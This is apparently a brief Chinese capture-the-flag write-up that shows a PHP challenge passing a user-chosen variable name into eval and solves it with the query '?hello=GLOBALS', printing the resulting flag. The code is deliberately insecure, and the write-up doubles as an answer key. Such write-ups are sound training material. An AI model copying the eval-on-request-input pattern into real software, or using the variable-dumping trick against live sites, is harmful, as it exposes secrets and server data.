# 爆破-1
```php
include "flag.php";  
$a = @$_REQUEST['hello'];  
if(!preg_match('/^\w*$/',$a )){  
die('ERROR');  
}  
eval("var_dump($$a);");  #提交时转换成 $GLOBALS 回显所有变量
show_source(__FILE__);  
?>
```
直接构造 `?hello=GLOBALS` 提交,在所有变量中找到 flag: `flag{f210df84-58c5-4b34-a5ec-14caf0d7ec0e}`
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTIxMjExNTcwNjldfQ==
-->